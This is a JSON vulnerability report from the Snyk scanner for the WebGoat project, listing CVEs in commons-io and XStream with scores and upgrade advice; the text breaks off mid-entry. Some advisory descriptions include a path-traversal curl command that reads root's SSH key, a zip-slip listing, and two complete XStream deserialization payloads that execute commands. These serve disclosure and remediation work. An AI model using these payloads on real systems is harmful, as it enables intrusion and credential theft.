{
  "vulnerabilities": [
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F",
      "alternativeIds": [],
      "creationTime": "2021-04-27T10:51:05.462338Z",
      "credit": [
        "Lukas Euler"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[commons-io:commons-io](https://search.maven.org/artifact/commons-io/commons-io) is a The Apache Commons IO library contains utility classes, stream implementations, file filters, file comparators, endian transformation classes, and much more.\n\nAffected versions of this package are vulnerable to Directory Traversal via calling the method FileNameUtils.normalize using an improper string like `//../foo` or `\\\\..\\foo`, which may allow access to files in the parent directory.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `commons-io:commons-io` to version 2.7 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-io/commit/fe7543eee5cd4b2f9e78aa44c31031b68eba204d)\n- [Jira Issue](https://issues.apache.org/jira/browse/IO-556)\n- [PoC](https://github.com/AlAIAL90/CVE-2021-29425)\n",
      "disclosureTime": "2021-04-26T16:04:00Z",
      "exploit": "Functional",
      "functions": [],
      "fixedIn": [
        "2.7"
      ],
      "id": "SNYK-JAVA-COMMONSIO-1277109",
      "identifiers": {
        "CWE": [
          "CWE-22",
          "CWE-20"
        ],
        "GHSA": [
          "GHSA-gwrp-pvrq-jmwv"
        ],
        "CVE": [
          "CVE-2021-29425"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-12-01T15:25:00.738443Z",
      "moduleName": "commons-io:commons-io",
      "packageManager": "maven",
      "packageName": "commons-io:commons-io",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-04-27T14:26:12Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/apache/commons-io/commit/fe7543eee5cd4b2f9e78aa44c31031b68eba204d"
        },
        {
          "title": "Jira Issue",
          "url": "https://issues.apache.org/jira/browse/IO-556"
        },
        {
          "title": "PoC",
          "url": "https://github.com/AlAIAL90/CVE-2021-29425"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Directory Traversal",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
          "cvssV3BaseScore": 4.3,
          "severity": "medium",
          "modificationTime": "2022-05-03T22:22:20.737922Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
          "cvssV3BaseScore": 4.8,
          "severity": "medium",
          "modificationTime": "2022-09-20T20:48:19.829663Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
          "cvssV3BaseScore": 4.8,
          "severity": "medium",
          "modificationTime": "2022-09-13T01:10:43.591317Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[0, 2.7)"
        ]
      },
      "mavenModuleName": {
        "groupId": "commons-io",
        "artifactId": "commons-io"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "commons-io:commons-io@2.6"
      ],
      "upgradePath": [
        false,
        "commons-io:commons-io@2.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-io:commons-io",
      "version": "2.6"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L/E:P/RL:U/RC:R",
      "alternativeIds": [],
      "creationTime": "2020-11-16T10:48:32.690590Z",
      "credit": [
        "Zhihong Tian",
        "Hui Lu"
      ],
      "cvssScore": 8.6,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The processed stream at unmarshalling time contains type information to recreate the formerly written objects. XStream creates therefore new instances based on these type information. An attacker can manipulate the processed input stream and replace or inject objects, that can execute arbitrary shell commands.\r\n\r\nThis issue is a variation of CVE-2013-7285, this time using a different set of classes of the Java runtime environment, none of which is part of the XStream default blacklist. The same issue has already been reported for Strut's XStream plugin in CVE-2017-9805, but the XStream project has never been informed about it.\r\n\r\n### PoC\r\n\r\n```\r\n<map>\r\n  <entry>\r\n    <jdk.nashorn.internal.objects.NativeString>\r\n      <flags>0</flags>\r\n      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\r\n        <dataHandler>\r\n          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\r\n            <contentType>text/plain</contentType>\r\n            <is class='java.io.SequenceInputStream'>\r\n              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\r\n                <iterator class='javax.imageio.spi.FilterIterator'>\r\n                  <iter class='java.util.ArrayList$Itr'>\r\n                    <cursor>0</cursor>\r\n                    <lastRet>-1</lastRet>\r\n                    <expectedModCount>1</expectedModCount>\r\n                    <outer-class>\r\n                      <java.lang.ProcessBuilder>\r\n                        <command>\r\n                          <string>calc</string>\r\n                        </command>\r\n                      </java.lang.ProcessBuilder>\r\n                    </outer-class>\r\n                  </iter>\r\n                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\r\n                    <method>\r\n                      <class>java.lang.ProcessBuilder</class>\r\n                      <name>start</name>\r\n                      <parameter-types/>\r\n                    </method>\r\n                    <name>start</name>\r\n                  </filter>\r\n                  <next/>\r\n                </iterator>\r\n                <type>KEYS</type>\r\n              </e>\r\n              <in class='java.io.ByteArrayInputStream'>\r\n                <buf></buf>\r\n                <pos>0</pos>\r\n                <mark>0</mark>\r\n                <count>0</count>\r\n              </in>\r\n            </is>\r\n            <consumed>false</consumed>\r\n          </dataSource>\r\n          <transferFlavors/>\r\n        </dataHandler>\r\n        <dataLen>0</dataLen>\r\n      </value>\r\n    </jdk.nashorn.internal.objects.NativeString>\r\n    <string>test</string>\r\n  </entry>\r\n</map>\r\n```\r\n\r\n*Note:* `1.4.14-jdk7`is optimised for OpenJDK 7,  release `1.4.14` are compatible with other JDK projects.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.14 or higher.\n## References\n- [GitHub Commit](https://github.com/x-stream/xstream/commit/0fec095d534126931c99fd38e9c6d41f5c685c1a)\n- [PoC](https://github.com/novysodope/CVE-2020-26217-XStream-RCE-POC)\n- [XStream advisory](https://x-stream.github.io/CVE-2020-26217.html)\n",
      "disclosureTime": "2020-11-16T14:02:37Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/XStream.java",
            "className": "XStream",
            "functionName": "fromXML"
          },
          "version": [
            "[0, 1.4.14-jdk7)"
          ]
        }
      ],
      "fixedIn": [
        "1.4.14"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1040458",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-mw36-7c6c-q4q2"
        ],
        "CVE": [
          "CVE-2020-26217"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-20T15:25:09.486906Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-11-16T10:59:35Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/0fec095d534126931c99fd38e9c6d41f5c685c1a"
        },
        {
          "title": "PoC",
          "url": "https://github.com/novysodope/CVE-2020-26217-XStream-RCE-POC"
        },
        {
          "title": "XStream advisory",
          "url": "https://x-stream.github.io/CVE-2020-26217.html"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T22:41:58.347336Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "severity": "high",
          "modificationTime": "2022-05-13T01:11:05.347665Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 9,
          "severity": "critical",
          "modificationTime": "2022-09-01T19:31:33.779365Z"
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.XStream",
            "functionName": "fromXML"
          },
          "version": [
            "[0, 1.4.14-jdk7)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 1.4.14)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.14"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-12-16T11:01:31.348811Z",
      "credit": [
        "Liaogui Zhong"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary File Deletion. A remote attacker can delete arbitrary known files on the host as long as the executing process has sufficient rights, by manipulating the processed input stream.\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.15 or higher.\n## References\n- [CVE-2020-26259 Details](https://x-stream.github.io/CVE-2020-26259.html)\n- [GitHub Advisory](https://github.com/x-stream/xstream/security/advisories/GHSA-jfvx-7wrx-43fh)\n- [GitHub Commit](https://github.com/x-stream/xstream/commit/0bcbf50126a62dfcd65f93a0da0c6d1ae92aa738)\n",
      "disclosureTime": "2020-12-16T10:53:35Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/XStream.java",
            "className": "XStream",
            "functionName": "fromXML"
          },
          "version": [
            "[,1.4.15)"
          ]
        }
      ],
      "fixedIn": [
        "1.4.15"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1051966",
      "identifiers": {
        "CWE": [
          "CWE-22"
        ],
        "GHSA": [
          "GHSA-jfvx-7wrx-43fh"
        ],
        "CVE": [
          "CVE-2020-26259"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-03-27T15:25:01.444419Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-16T17:24:55Z",
      "references": [
        {
          "title": "CVE-2020-26259 Details",
          "url": "https://x-stream.github.io/CVE-2020-26259.html"
        },
        {
          "title": "GitHub Advisory",
          "url": "https://github.com/x-stream/xstream/security/advisories/GHSA-jfvx-7wrx-43fh"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/0bcbf50126a62dfcd65f93a0da0c6d1ae92aa738"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Arbitrary File Deletion",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N",
          "cvssV3BaseScore": 6.8,
          "severity": "medium",
          "modificationTime": "2022-01-03T18:06:55.488952Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L",
          "cvssV3BaseScore": 5.4,
          "severity": "medium",
          "modificationTime": "2022-05-03T22:43:40.608764Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N",
          "cvssV3BaseScore": 6.8,
          "severity": "medium",
          "modificationTime": "2022-09-01T15:44:19.262122Z"
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.XStream",
            "functionName": "fromXML"
          },
          "version": [
            "[,1.4.15)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.4.15)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.15"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:F",
      "alternativeIds": [],
      "creationTime": "2020-12-16T11:07:48.518257Z",
      "credit": [
        "Liaogui Zhong"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Server-Side Request Forgery (SSRF). A remote attacker can request data from internal resources that are not publicly available by manipulating the processed input stream.\r\n\r\n*Note:* This vulnerability does not exist running Java 15 or higher, and is only relevant when using `XStream`'s default blacklist.\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.15 or higher.\n## References\n- [Exploit Repo](https://github.com/Al1ex/CVE-2020-26258)\n- [GitHub Commit](https://github.com/x-stream/xstream/commit/6740c04b217aef02d44fba26402b35e0f6f493ce)\n- [XStream Advisory](https://x-stream.github.io/CVE-2020-26258.html)\n",
      "disclosureTime": "2020-12-16T11:01:34Z",
      "exploit": "Functional",
      "functions": [
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/XStream.java",
            "className": "XStream",
            "functionName": "setupSecurity"
          },
          "version": [
            "[1.4.7,1.4.15)"
          ]
        },
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/XStream.java",
            "className": "XStream",
            "functionName": "setupConverters"
          },
          "version": [
            "[1.1.1, 1.4.6)"
          ]
        },
        {
          "functionId": {
            "filePath": "com/thoughtworks/xstream/XStream.java",
            "className": "XStream",
            "functionName": "<init>"
          },
          "version": [
            "[,1.1)"
          ]
        }
      ],
      "fixedIn": [
        "1.4.15"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1051967",
      "identifiers": {
        "CWE": [
          "CWE-918"
        ],
        "GHSA": [
          "GHSA-4cch-wxpw-8p28"
        ],
        "CVE": [
          "CVE-2020-26258"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-01-13T10:27:05.802373Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-16T17:24:55Z",
      "references": [
        {
          "title": "Exploit Repo",
          "url": "https://github.com/Al1ex/CVE-2020-26258"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/x-stream/xstream/commit/6740c04b217aef02d44fba26402b35e0f6f493ce"
        },
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2020-26258.html"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Server-Side Request Forgery (SSRF)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
          "cvssV3BaseScore": 7.7,
          "severity": "high",
          "modificationTime": "2022-01-03T18:07:15.287678Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
          "cvssV3BaseScore": 7.7,
          "severity": "high",
          "modificationTime": "2022-09-01T15:46:35.705340Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
          "cvssV3BaseScore": 4.3,
          "severity": "medium",
          "modificationTime": "2022-05-03T22:41:59.523576Z"
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.XStream",
            "functionName": "setupSecurity"
          },
          "version": [
            "[1.4.7,1.4.15)"
          ]
        },
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.XStream",
            "functionName": "setupConverters"
          },
          "version": [
            "[1.1.1, 1.4.6)"
          ]
        },
        {
          "functionId": {
            "className": "com.thoughtworks.xstream.XStream",
            "functionName": "<init>"
          },
          "version": [
            "[,1.1)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.4.15)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.15"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:H/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T12:09:53.420253Z",
      "credit": [
        "Liaogui Zhong"
      ],
      "cvssScore": 5.8,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability which may allow a remote attacker who has sufficient rights to execute local commands on the host only by manipulating the processed input stream. \r\n\r\n### PoC\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\r\n        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\r\n          <packet>\r\n            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\r\n              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\r\n                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\r\n                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\r\n                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\r\n                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>\r\n                      <uriProperties/>\r\n                      <attributeProperties/>\r\n                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\r\n                        <getter>\r\n                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>\r\n                          <name>verify</name>\r\n                          <parameter-types/>\r\n                        </getter>\r\n                      </inheritedAttWildcard>\r\n                    </bi>\r\n                    <tagName/>\r\n                    <context>\r\n                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\r\n                        <outer-class reference='../..'/>\r\n                      </marshallerPool>\r\n                      <nameList>\r\n                        <nsUriCannotBeDefaulted>\r\n                          <boolean>true</boolean>\r\n                        </nsUriCannotBeDefaulted>\r\n                        <namespaceURIs>\r\n                          <string>1</string>\r\n                        </namespaceURIs>\r\n                        <localNames>\r\n                          <string>UTF-8</string>\r\n                        </localNames>\r\n                      </nameList>\r\n                    </context>\r\n                  </bridge>\r\n                </bridge>\r\n                <jaxbObject class='com.sun.corba.se.impl.activation.com.sun.corba.se.impl.activation.ServerTableEntry'>\r\n                  <activationCmd>calc</activationCmd>\r\n                </jaxbObject>\r\n              </dataSource>\r\n            </message>\r\n            <satellites/>\r\n            <invocationProperties/>\r\n          </packet>\r\n        </indexMap>\r\n      </comparator>\r\n    </default>\r\n    <int>3</int>\r\n    <string>javax.xml.ws.binding.attachments.inbound</string>\r\n    <string>javax.xml.ws.binding.attachments.inbound</string>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21345.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T11:50:00Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088328",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-hwpc-8xqv-jvj4"
        ],
        "CVE": [
          "CVE-2021-21345"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-03-23T17:13:20.980997Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:20.978671Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21345.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.9,
          "severity": "critical",
          "modificationTime": "2022-02-16T16:10:18.737562Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:37:53.150901Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-05-03T22:10:19.222862Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T12:30:28.519410Z",
      "credit": [
        "Liaogui Zhong"
      ],
      "cvssScore": 5.3,
